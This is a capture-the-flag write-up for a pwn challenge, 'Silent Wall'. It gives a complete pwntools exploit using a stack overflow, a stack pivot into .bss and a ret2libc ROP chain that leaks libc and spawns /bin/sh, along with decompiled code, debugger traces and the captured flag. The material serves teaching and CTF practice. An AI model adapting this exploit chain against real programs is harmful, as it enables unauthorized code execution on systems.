# Silent Wall
Author: qwertyuiopp  
Binary  
Description  
Solves 2  

One wall collapses, a new one will rise! (❍ᴥ❍ʋ)

Welcome to.... The Silence Wall! d(d＇∀＇)

To prevent people from shouting the wall down again, we removed the echo feature. ᕕ ( ᐛ ) ᕗ

[Silence Wall](./program)

[Solve script template](./template)

`nc chal.firebird.sh 35047`

## Solution:
```py
from pwn import * 
import time 
binary = "./program_patched"

# typical pwn script prologue 
elf = ELF(binary)
libc = ELF("./libc.so.6") # loading libc binary
context.binary = elf 
p = process(binary)
#p = remote("chal.firebird.sh", 35047)

# debugging
s = '''
b* my_read
b* leave_messages_with_great_care+61
b* leave_messages_with_great_care+80
'''
gdb.attach(p, s)

# first my_read, I did not use that at all 
p.recvuntil(b"Write some words on the top right corner of the wall:\n")
p.sendline(b'1') 
p.recvuntil(b"Write some words right in the center of the wall with GREAT care:\n")

# buf, unused .bss segment to migrate stack to 
buf1 = elf.bss() + 0x500
buf2 = elf.bss() + 0x600 
# print(hex(buf1)) # 0x602520
# print(hex(buf2)) # 0x602620

# gadgets found with ROPgadget --binary program | grep ''
leave_ret = 0x0000000000400868
pop_rsi_ret = 0x0000000000400a31
pop_rdi_ret = 0x0000000000400a33
ret = 0x0000000000400576

# prevent payload from sticking together
time.sleep(1)


# just going from leave_message to my_read, migrate stack and continue ROP chain 
payload1 = flat(
    # 96 bytes to write in this payload 
    b'1' * 0x30,    # padding to rbp, 48 bytes, 6 more lines to go
    buf1,           # rbp of next stack frame

    # preparing and moving to the next frame 
    pop_rdi_ret,
    buf1,
    elf.sym['my_read'], # see whats rsi

    leave_ret
)

p.send(payload1)

time.sleep(1)
# leaking libc addresses
payload2 = flat(
    # 96 bytes to write 
    buf2,   # rbp of the next frame, this gets popped and ROP chain continues(supposed)

    # leaking the libc addresses
    pop_rdi_ret,
    elf.got['puts'],
    elf.plt['puts'], # should print out the libc addresses

    # preparing and moving to the next frame 

    
    pop_rdi_ret,
    buf2,
    elf.sym['my_read'],
    leave_ret
)

p.send(payload2)

# parse the leaked address and calculate libc base address
GOT_leak = int.from_bytes(p.recvuntil(b'\x7f'), 'little')
libc.address = GOT_leak - libc.sym['puts']
print(hex(libc.address))


time.sleep(1)
# pass /bin/sh into system, get the shell 
payload3 = flat(
    b'A' * 8,
    ret,
    pop_rdi_ret,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
)

p.send(payload3)


p.interactive()
```
run the above script that make use stack migration together with ROP chain to leak libc function address, calculate libc `system` address, pass in `/bin/sh` and get the shell.  


## Observations
### Security of the binary 
```
┌──(kali㉿kali)-[~/Desktop/CTF/silenceWall]
└─$ checksec ./program
[*] '/home/kali/Desktop/CTF/silenceWall/program'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

```
- `Full RELRO`: Program loads libc function addresses at start and make them read-only, that means we cannot rewrite the address and thus it is unlikely to perform GOT hijacking.  
- `No canary found`: Buffer overflow would be easier  
- `NX enalbed`: No sections being both writable and executable, unlikely that this is a shellcode injecting attack  
- `No PIE`: Addresses of `.text`, `.data` and `.bss` sections are not randomized and we have many return choices after overflowing   

### Source code
Source code is not provided in this challenge but the program can be easily reversed with ghidra decompiler, here is the result of decompiling:
```c
void my_read(void *buffer, size_t size)

{
    read(0, buffer, size);
    return;
}

void leave_messages_with_great_care(void)

{
    undefined message[48];

    if (collapsed != 0)
    {
        puts("There\'s nothing left but ruins...");
        /* WARNING: Subroutine does not return */
        exit(0);
    }
    puts("Write some words right in the center of the wall with GREAT care:");
    my_read(message, 0x60);
    collapsed = 1;
    return;
}

undefined main(void)
{
    char buffer[48];

    setvbuf(stdin,(char *)0x0,2,0);
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    if (collapsed != 0) {
    puts("There\'s nothing left but ruins...");
                    /* WARNING: Subroutine does not return */
    exit(0);
    }
    print_wall();
    puts("Welcome to the even more popular attraction in UwU Kingdom, the Silence Wall!");

    puts("Write some words on the top right corner of the wall:");
    my_read(buffer,0x30);
    print_wall_broken();
    puts("Oops....");
    puts("I think I need to reduce the strength of my writing...");
    leave_messages_with_great_care();
    puts("Booooooooooomm!!!");

    return 0;
}
```
Let's break down the program into smaller parts and analyse!  
#### `my_read` function
```c
void my_read(void *buffer, size_t size){
    read(0, buffer, size);
    return;
}
```
This is used for user input, while the input size is controllable which is used in main like the following:
```c
my_read(buffer,0x30);
```
My initial thought about this, was thinking about it is probably intended for players to somehwo control the second parameter e.g. with `pop rsi` gadget to increase payload size and do more bad things etc. 
#### `main` and `leave_messages_with_great_care`  
Except printing messages, `main` first allows user to input `0x30` bytes messages and then go inside `leave_...` to input more bytes  
```c
    print_wall_broken();
    puts("Oops....");
    puts("I think I need to reduce the strength of my writing...");
    leave_messages_with_great_care();
```
`leave_...` seems to allow more bytes to input i.e. `0x60`, which `96` bytes. but the array `undefined message[48];` that gets the input would also take `48`, which means we only have `48` bytes i.e. `6` messages left for our payload.  
Therefore, something like the following cannot be finished within one payload:  
```py
b'A' * 0x30,  # for the 48 bytes array 
buf, # overwritting old rbp 
# 56 bytes already 

pop_rdi, # +8 bytes
buf1, # +8 bytes
pop_rsi, # +8 bytes
0x60, # +8 bytes
0, # +8 bytes
elf.sym['my_read'], # +8 bytes

leave_ret # +8 bytes
# in total, 112 bytes
```
The above is exactly what is supposed to be sent as the first payload in this challenge as `my_read` function requires 2 arguments. But it cannot be sent as `leave_...` calls `my_read` 
with just `96` bytes.  
```c
my_read(message, 0x60);
```
Also, we are not allowed to go into `leave_...` twice from the start because of the following code inside `leave_...`:  
```c
    if (collapsed != 0)
    {
        puts("There\'s nothing left but ruins...");
        /* WARNING: Subroutine does not return */
        exit(0);
    }
    ...
    ...
    collapsed = 1;
```
~~although i have no clue what else can be done going back in~~   

### Attack  
Since there is no canary and no PIE for the program, we can easily overflow the buffer up to the return address and return to any places we want.     
In this particular program, the technique that we are going to be   
- ROP   
- stack migration  
Specifically, we are going to first:  
1. Start our ROP chain from `leave_...` where it calls `my_read` with `96` bytes available buffer. And since the size of the buffer is not enough:
2. We migrate the stack, first by preparing to migrate by overwritting the `saved old rbp` to the location of where our stack migrate to
3. Then we make use of the `my_read` in our payload to read some more ROP chain instructions into the new buffer
4. Lastly, we land a `leave ; ret` gadget at the end, to migrate by changing `rsp` to our overwritten `saved old rbp`, `pop` that `rbp`. Then `rsp` is going to decrease increase by `1` so that we are back to instructions with `ret` i.e. `gadgets` to continue our ROP chain .

Above is the idea our ROP chain attack and how stack mgiration helps dealing with the size problem. We are doing the above for the follow attacking goals:  
1. leak libc version, libc base addresses  
2. calculate and call `system` with `/bin/sh`   

#### Problem
The only problem is, mentioned above, that the size of our very first payload is way too large such that it cannot fit in `48` bytes sized payload provided by `leave_...` function 

#### How to counter it
From reading the write-up from the author, it seems like we are able to   
1. split the first payload into 2 parts, one in the very first `my_read` (0x30 bytes) in `main` and somehow it can be aligned with the one written in `leave_...`   
2. Or, since `PIE` and `endbr64` is not enabled, we are able to jump to arbirary addresses. Then, we can use the address that goes to a specific instruction in `leave_...` where it calls `my_read` with `96`   bytes and would quickly return, which can be a `my_read` that is able to continue the ROP chain while able to read enough size of payloads.     

And the way I did it, was basically luck.   
I noticed that the very start of our buffer in the first payload i.e. `b'A' * 30` in   
```py
payload1 = flat(
    # 96 bytes to write in this payload 
    b'A' * 0x30,    # padding to rbp, 48 bytes, 6 more lines to go
    buf1,           # rbp of next stack frame

    # preparing and moving to the next frame 
    pop_rdi_ret,
    buf1,
    elf.sym['my_read'], # see whats rsi

    leave_ret
)
```
would just go inside `rsi` right before `my_read` is called. I first thought of changing it to   
`b'1' * 30` so that `my_read` can get a very large input size `11111111111....`. But in fact, it is just a byte string anyway.    

However, the above is "worked"  

```
 ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
        fd: 0 (pipe:[374499])
        buf: 0x602520 ◂— 0
        nbytes: 0x7ffec06c0b80 ◂— '111111111111111111111111111111111111111111111111 %`'
```

Because in fact, what `rsi` really stores, is actually an address, probably the starting address of the buffer. And the parameters `nbytes` which is the input size, or the program most probably had interpreted the address `0x7ffec06c0b80` as a very large integer, which is valid and thus the program does not crash from there, then we safely go to payload2 which has been written in `buf1`  

And on the next `my_read`, the `my_read` tha tis supposed to read stuff for `buf2`, similar thing happened. It just read in an some random addresses on stack as shown below:  
```
 ► 0x400862 <my_read+32>                          call   read@plt                    <read@plt>
        fd: 0 (pipe:[635144])
        buf: 0x602620 ◂— 0
        nbytes: 0x7f4996fec7e3 (_IO_2_1_stdout_+131) ◂— 0xfed8c0000000000a /* '\n' */
```
and then it just worked and the program proceed to   
```py
payload3 = flat(
    b'A' * 8,
    ret,
    pop_rdi_ret,
    next(libc.search(b'/bin/sh')), # search and get address of string "/bin/sh" in libc binary 
    # libc.search(b'/bin/sh') returns an iterator of all addresses where "/bin/sh" appears in libc
    # next() gets the first result from this iterator
    libc.sym['system']
)
```
which was supposed to be written in `buf2` during that above `my_read` with weird addresses as its 2nd parameter. After `puts` addresses is leaked.   
By the way, right before we send our payload3, i.e. the above payload, we have already calculated and libc base. So everything worked fine  
```py
GOT_leak = int.from_bytes(p.recvuntil(b'\x7f'), 'little')
libc.address = GOT_leak - libc.sym['puts']
print(hex(libc.address))
```

Anyways, after payload3, we get a shell and thus the flag, yeah!!!!!!  

```
┌──(kali㉿kali)-[~/Desktop/CTF/silenceWall]
└─$ python solve.py
[*] '/home/kali/Desktop/CTF/silenceWall/program_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
[*] '/home/kali/Desktop/CTF/silenceWall/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process './program_patched': pid 33268
[+] Opening connection to chal.firebird.sh on port 35047: Done
0x602520
0x602620
0x7f2db68e8000
[*] Switching to interactive mode

$ ls
SilenceWall
flag.txt
$ cat flag.txt
flag{Str0ngm5n_wh0_m4st5r_4t_Siṃhanāda_pl54s5_st4y_4w4y_from_th5_w4ll_UwU}$ 
```
